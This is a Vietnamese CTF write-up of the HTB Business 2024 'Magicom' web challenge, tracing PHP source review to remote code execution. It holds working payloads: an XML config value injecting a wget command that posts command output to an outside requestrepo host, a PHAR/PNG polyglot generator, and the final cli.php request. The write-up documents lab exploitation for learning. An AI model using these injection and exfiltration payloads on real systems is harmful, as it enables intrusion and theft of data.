---
title: HTB Business CTF 2024 Write Up - Magicom
tags: [CTF]
slug: htb-business-2024
date: 2024-05-25 21:42:04+0000

---

Trong giải HTB Business này, mình tham gia vào làm challenge Omniwatch và Magicom cùng với các teammates trong câu lạc bộ. Chúng mình đã solve được challenge Omniwatch, còn Magicom thì gần như đã làm được, chỉ thiếu một bước nữa nhưng chúng mình đã đi sai hướng và không tìm ra cách giải kịp giờ nên không kịp solve.
Mình muốn viết là để chia sẻ lại quá trình giải challenge của mình và các teammates, và cũng như là hướng giải đúng đắn để solve challenge. Mình đã tham khảo official solution và nhận ra anh em đã đi đúng gần hết các bước, chỉ có bước đầu là chưa ra, nên bước đầu của mình sẽ đi theo con đường của official write up. Mình sẽ tiến hành vào khai thác tại local vì mình viết write up này hơi muộn nên không deploy trên server kịp=))
## Preface
Challenge xuất hiện dưới dạng một website có chức năng xem sản phẩm và thêm sản phẩm, người dùng có thể thêm sản phẩm và một số các thông tin của sản phẩm, trong đó là phần ảnh minh họa:
![image](https://hackmd.io/_uploads/BkhzXty40.png)
Đã được add product tùy theo ý mình mà còn unauthen, mình ban đầu cũng nghĩ upload php để RCE:
![image](https://hackmd.io/_uploads/Sya5yqJN0.png)
## Phân Tích Source Code
### Config
Ngay sau khi mình mở source của challenge mình đã thấy đây chắc chắn không phải là một challenge upload file PHP thông thường. Vì challenge cung cấp cả phpinfo tại /info, và file php.ini, mình nhìn sơ qua qua thì cũng chưa có gì bất thường, nhưng chắc chắn là mình cần phải dùng đến chúng.
```php!
$router->get('/info', function(){
    return phpinfo();
});
```
![image](https://hackmd.io/_uploads/S1fCHcy4R.png)
### Source Code
Challenge đã quy định những route có thể truy cập tại website trong index.php:
```php!
$router = new Router;

$router->get('/', 'HomeController@index');
$router->get('/home', 'HomeController@index');
$router->get('/product', 'ProductViewController@index');
$router->get('/addProduct', 'AddProductController@index');
$router->post('/addProduct', 'AddProductController@add');
$router->get('/info', function(){
    return phpinfo();
});
```
Mình ngay lập tức đi tìm kiếm những đoạn code xử lý upload file:
1. models/ImageModel.php
```php!
class ImageModel {
    public function __construct($file) {
        $this->file = $file;
    }

    public function isValid() {

        $allowed_extensions = ["jpeg", "jpg", "png"];
        $file_extension = pathinfo($this->file["name"], PATHINFO_EXTENSION);
        print_r($this->file);
        if (!in_array($file_extension, $allowed_extensions)) {
            return false;
        }

        $allowed_mime_types = ["image/jpeg", "image/jpg", "image/png"];
        $mime_type = mime_content_type($this->file['tmp_name']);
        if (!in_array($mime_type, $allowed_mime_types)) {
            return false;
        }

        if (!getimagesize($this->file['tmp_name'])) {
            return false;
        }

        return true;
    }
}
```
- Class này được gọi trong request xử lý file nên mình muốn nói về nó trước. Quá trình kiểm duyệt file được gói gọn trong hàm isValid()
- File extension được lấy bằng PATHINFO_EXTENSION và được whitelist => loại bỏ khả năng bypass upload file php bypass bằng extension file
- Sử dụng print_r để in ra mảng thông tin của file đó theo dạng `[key] => value`
- Sau khi check extension class tiếp tục check mime types bằng cách whitelist, và cuối cùng là check size bằng getimagesize. Mình gần như không thấy cơ hội nào để upload file PHP mà RCE được, nhưng đoạn print_r thông tin khá thú vị, vì nó chứa giá trị `tmp_name`

2. controllers/AddProductController.php
```php!
public function add() 
{
    if (empty($_FILES['image']) || empty($_POST['title']) || empty($_POST['description']))
    {
        header('Location: /addProduct?error=1&message=Fields can\'t be empty.');
        exit;
    }

    $title = $_POST["title"];
    $description = $_POST["description"];
    $image = new ImageModel($_FILES["image"]);

    if($image->isValid()) {

        $mimeType = mime_content_type($_FILES["image"]['tmp_name']);
        $extention = explode('/', $mimeType)[1];
        $randomName = bin2hex(random_bytes(8));
        $secureFilename = "$randomName.$extention";

        if(move_uploaded_file($_FILES["image"]["tmp_name"], "uploads/$secureFilename")) {
            $this->product->insert($title, $description, "uploads/$secureFilename");

            header('Location: /addProduct?error=0&message=Product added successfully.');
            exit;
        }
    } else {
        header('Location: /addProduct?error=1&message=Not a valid image.');
        exit;
    }
}
```
- Nếu có dấu hiệu upload file, webserver đưa nó vào class ImageModel để sử dụng hàm isValid để check, nếu như return true thì lấy extension file bằng cách bổ đôi cái mime type mà lấy cái thứ 2 -> đoạn này khá lỏng lẻo vì giá trị đó mình control được nhưng đằng trước là whitelist nên đành chịu
- Gắn file extension vừa lấy được với 16 ký tự random được gen bằng `bin2hex(random_bytes(8))`, move vào thư mục uploads và trả về thông báo và lỗi nếu có.

Riêng đoạn code check valid tại class ImageModel đã làm cho mình không tin tưởng vào việc có thể bypass upload file PHP nữa, mặc dù đoạn lấy extension ở controller khá ngon nhưng hàm valid lại quá chặt nên mình đi đọc những file khác vì còn rất nhiều thứ chưa được sử dụng.
Đáng chú ý nhất chắc chắn là file cli/cli.php, nó vốn được dùng để import file sql chứa các sản phẩm mặc định vào database bằng command line, sau đó file sql sẽ bị xóa:
```bash!
php /www/cli/cli.php -c /www/cli/conf.xml -m import -f /www/products.sql
rm /www/products.sql
```
Vì pha import này quá cồng kềnh, chả có lí do gì phải làm hẳn 1 file php chỉ để import 1 file sql vào, nên mình chắc chắn sẽ khai thác từ file này ra:
Ngay từ đầu file đã đánh phủ đầu bằng việc check xem file có được thực thi thông qua dòng lệnh hay không:
```php!
if (!isset( $_SERVER['argv'], $_SERVER['argc'] ) || !$_SERVER['argc']) {
    die("This script must be run from the command line!");
}
```
`argv` và `argc` là 2 biến siêu toàn cục, trong đó `argv` sẽ là một mảng lưu giá trị của các tham số truyền được truyền vào file php dưới dạng mảng `[số thứ tự] => value`. Còn `argc` sẽ chứa số các tham số được truyền vào.
Ví dụ như với câu lệnh chạy file cli.php như ở trên, thì giá trị của `argv` sẽ có dạng như sau:
```
Array
(
    [0] => -c
    [1] => /www/cli/conf.xml
    [2] => -m
    [3] => import
    [4] => -f
    [5] => /www/products.sql
)
```
Còn `argc` sẽ mang giá trị là 6, ứng với số tham số truyền vào
File có thể gồm 3 tham số truyền vào:
```!
-c (--config): Truyền vào đường dẫn tuyệt đối đến file config ở định dạng xml
-m (--method): Tên phương thức hành động tương ứng, gồm có import, backup và healthcheck
-f (--filename): Sử dụng khi dùng method import, truyền vào tên file để import dữ liệu vào database
```
Tham số `-c` khá quan trọng, giá trị này sẽ được check xem có phải là thư mục hay không, nếu có sẽ chèn thêm `config.xml` trước rồi return đệ quy để tiếp tục kiểm tra, tiếp đó kiểm tra xem file có tồn tại, và file đó thêm `.xml` có tồn tại hay không, nếu 1 trong 2 tồn tại thì return về giá trị đó.
```php!
function isConfig($probableConfig) {
    if (!$probableConfig) {
        return null;
    }
    if (is_dir($probableConfig)) {
        return isConfig($probableConfig.\DIRECTORY_SEPARATOR.'config.xml');
    }

    if (file_exists($probableConfig)) {
        return $probableConfig;
    }
    if (file_exists($probableConfig.'.xml')) {
        return $probableConfig.'.xml';
    }
    return null;
};
```
Sau khi đã xác định file config có tồn tại, file mới được đưa vào xử lý:
```php!
function getConfig($name) {
    $configFilename = isConfig(getCommandLineValue("--config", "-c"));
    if ($configFilename) {
        $dbConfig = new DOMDocument();
        $dbConfig->load($configFilename);
        $var = new DOMXPath($dbConfig);
        foreach ($var->query('/config/db[@name="'.$name.'"]') as $var) {
            return $var->getAttribute('value');
        }
        return null;
    }
    return null;
}
```
- Sử dụng DOMDocument() để load file config, sau đó query lấy giá trị từ thẻ gốc `<config>`->`<db>`, lấy attribute `name` lưu vào biến $vars và lấy attribute `value` của name tương ứng.
- Ta cũng có format của một file config sẽ như thế nào:
```xml!
<config>
    <db name="username" value="root"/>
    <db name="password" value="root"/>
    <db name="database" value=""/>
</config>
```
Hàm `generateFilename` dùng để tạo ra tên file ngẫu nhiên khi sử dụng method backup:
```php!
function generateFilename() {
    $timestamp = date("Ymd_His");
    $random = bin2hex(random_bytes(4));
    $filename = "backup_$timestamp" . "_$random.sql";
    return $filename;
}
```
=> Kết quả cho ra file sql backup với filename sử dụng kết hợp ngày tháng và 8 ký tự random
1. Method backup
```php!
function backup($filename, $username, $password, $database) {
    $backupdir = "/tmp/backup/";
    passthruOrFail("mysqldump -u$username -p$password $database > $backupdir$filename");
}
```
- Tại method này, server thực thi câu lệnh dump toàn bộ database vào file được quy định trước, với tên filename gen random; 3 giá trị username, password và database được lấy từ file config
2. Method import
```php!
function import($filename, $username, $password, $database) {
    passthruOrFail("mysql -u$username -p$password $database < $filename");
}
```
- Tiếp tục sử dụng câu lệnh hệ thống đưa dữ liệu của filename được chỉ định vào database
3. Method healthcheck:
```php!
function healthCheck() {
    $url = 'http://localhost:80/info';

    $headers = get_headers($url);

    $responseCode = intval(substr($headers[0], 9, 3));

    if ($responseCode === 200) {
        echo "[+] Daijobu\n";
    } else {
        echo "[-] Not Daijobu :(\n";
    }
}
```
- Hàm truy cập đến path info dùng để hiển thị phpinfo() và lấy status code trả về thông qua header. Nếu 200 thì coi là ổn, khác thì bị coi là không ổn

=> Method backup và import có khả năng command injection nếu như control được giá trị trong file config. Còn với option -f thì không chắc vì nó cũng bị kiểm tra bằng `file_exists` nên không thể command injection sau filename được.
## Khai Thác
### Command Injection in cli.php
Mình mất một lúc để nhận ra có thể truy cập đến cli.php thông qua website /cli/cli.php. Nên mình đang nghĩ đến command injection vào các method, nhưng làm thế nào để bypass sử dụng trên command line?
Đang tìm cách thì teammates của mình phát hiện ra tại php.ini giá trị `register_argc_argv` đã bị comment: Giá trị này được mặc định là off, nếu như config này được kích hoạt thì mình hoàn toàn có thể truyền vào giá trị của 2 biến này thông qua dấu `+` thay vì dùng dấu `&` để ngăn cách. 
![image](https://hackmd.io/_uploads/HkoZro1EC.png)
![image](https://hackmd.io/_uploads/SkXyOoJN0.png)
Vậy thì mình có thể lợi dụng việc này để truyền giá trị vào các tham số -m và -c, thực thi file cli.php như đang ở command line, mình truy cập thử đến mode healthcheck thì thấy file hoàn toàn có thể thực thi được:
![image](https://hackmd.io/_uploads/HyCfLjyE0.png)
Mình quyết định sẽ lấy mode backup làm sink để RCE, với việc sử dụng DOMXPath query lấy dự liệu từ file xml, mình tạm thời bỏ qua việc upload file lên như nào mà craft một file xml để command injection vào username:
```xml!
<config>
    <db name="username" value='|| wget --post-data "$(id)" -O- ut8mgeo8.requestrepo.com ||'/>
    <db name="password" value="root"/>
    <db name="database" value=""/>
</config>
```
Để tránh câu lệnh bị thực thi khi echo vào thì mình base64 trước rồi truyền vào a.xml
![image](https://hackmd.io/_uploads/HJFQdoJE0.png)
Thử truyền vào method backup và tên file config là: /tmp/a.xml
![image](https://hackmd.io/_uploads/SybD_oJ40.png)
Và mình thấy kết quả trả về requestrepo, đây là sink đúng để có thể RCE:
![image](https://hackmd.io/_uploads/BJmt_i1VA.png)
Oke vậy là đã có chỗ để RCE, vấn đề còn lại là upload file xml này lên như nào với cái rule whitelist kia thôi.
### Race Condition??
Như mình đã nói ở trên, có 2 thứ mà mình thấy mình chưa sử dụng được trong challenge này, thứ nhất là trang phpinfo, và thứ 2 là cái print_r hiện thông tin của file. Khi PHP script nhận được một file request, file đó sẽ được lưu tạm thời trong thư mục /tmp và có thể tùy chỉnh trong php.ini. Trong trường hợp này sẽ là /tmp/php+6 ký tự [a-zA-Z0-9]. File trong thư mục tmp sẽ biến mất sau khi có sự xuất hiện của hàm `move_uploaded_file` hoặc khi PHP script đó kết thúc. Nghe ná ná giống với case LFI2RCE với phpinfo nên mình và teammate triển luôn theo hướng này.
Bọn mình dự định sẽ upload file sau đó vào phpinfo để xem đường dẫn file tmp, rồi sử dụng mode backup để command injection. Nhưng sau khi thử rất nhiều lần không được, mình đã đi tìm hiểu kĩ hơn và nhận ra mình đã sai và chưa hiểu bản chất: Lỗi LFI2RCE với phpinfo xảy ra khi mình có thể upload file tại trang phpinfo luôn, tức là có thể sử dụng POST request. PHP sẽ lưu các file được upload lên thư mục temp đối với cả các PHP script không hề hỗ trợ xử lý file trong nó, còn ở đây mình chỉ có thể GET /info, nên cách này coi như tiêu tùng. Ref: http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/
Không từ bỏ việc race, mình quyết định đánh vào khả năng print_r mảng về thông tin file khi upload file tại `/addProduct`, nhưng việc này cũng bất khả thi vì file đã được xử xong xuôi hết r mới có response trả về cho mình, mình đã tốn 2 ngày để thử theo phương pháp này và không thu được kết quả gì, vậy là challenge đã không thể solve kịp trước khi cuộc thi kết thúc :((
### The right path: Phar Deserialization
Mình cứ mải đi race mà không nghĩ ra DOMDocument hỗ trợ cả file phar, tương tự như trong case [XXE to Phar Deserialize](https://blog.efiens.com/post/doublevkay/xxe-to-phar-deserialization/) khi DOMDocument->loadXML có thể truyền vào phar protocol thì ở đây, DOMDocument->load cũng có thể truyền vào phar protocol -> +1 kiến thức.
Thiên thời địa lợi nhân hòa, config phar.readonly cũng được tắt => có thể deser file phar:
![image](https://hackmd.io/_uploads/ByzNl3kNR.png)
Nếu như đã hỗ trợ deser phar file, thì mình chỉ cần để file xml của mình vào file phar và nhét vào 1 file ảnh valid là được. Về cách gen file phar như nào thì mình sẽ làm tương tự như chall upload phar file trong root me. Ref: https://thanhlocpanda.wordpress.com/2023/08/07/php-phar-jpeg-polyglot-javascript-jpeg-polyglot-root-me-part-ii/ (pass: thanhlocpanda)
Đường đi nước bước đã đủ, mình tổng hợp lại attack chain như sau:
- Gen file ảnh càng ngắn càng tốt
- Lấy hex của file đó, đắp vào file phar, chèn xml vào file phar và đổi extension về ảnh
- Upload file ảnh, lấy đường dẫn ảnh
- Gọi đến cli.php, sử dụng phar:// protocol gọi đến file xml nằm trong file phar => RCE
### Final Exploit
Mình gen ảnh 1 pixel cho nó bé bằng đoạn code:
```python!
from PIL import Image

img = Image.new("RGB", (1,1), (255,255,255))
img.save("gen.png")
```
Mình lấy hex bằng cyberchef và được chuỗi:
```!
\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90\x77\x53\xde\x00\x00\x00\x0c\x49\x44\x41\x54\x78\x9c\x63\xf8\xff\xff\x3f\x00\x05\xfe\x02\xfe\x0d\xef\x46\xb8\x00\x00\x00\x00\x49\x45\x4e\x44\xae\x42\x60\x82
```
Đưa chuỗi vào scrip gen file phar, mình nhét file a.xml với payload đọc flag bằng `/readflag` vào trong file phar, rồi đổi tên file thành phar.png:
```php!
<?php
    $png = "\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90\x77\x53\xde\x00\x00\x00\x0c\x49\x44\x41\x54\x78\x9c\x63\xf8\xff\xff\x3f\x00\x05\xfe\x02\xfe\x0d\xef\x46\xb8\x00\x00\x00\x00\x49\x45\x4e\x44\xae\x42\x60\x82";
    $xml_data = "<config><db name=\"username\" value='|| wget --post-data \"$(/readflag)\" -O- ut8mgeo8.requestrepo.com ||'/><db name=\"password\" value=\"root\"/><db name=\"database\" value=\"\"/></config>";
    $phar = new Phar("phar.phar");
    $phar->startBuffering();
    $phar->addFromString("a.xml", $xml_data);
    $phar->setStub($png."__HALT_COMPILER(); ?>");
    $phar->stopBuffering();

    rename('phar.phar', 'phar.png');
?>
```
Upload file phar lên server thành công:
![image](https://hackmd.io/_uploads/B1NAW3J4C.png)
Vào list product để lấy tên ảnh, của mình là `/uploads/3e10700de9433bdb.png`
Request đến cli.php để lụm flag thôi:
```
GET /cli/cli.php?-m+backup+-c+phar:///www/uploads/3e10700de9433bdb.png/a.xml
```
![image](https://hackmd.io/_uploads/Sk35G3yNC.png)
![image](https://hackmd.io/_uploads/rkSiM3yEC.png)
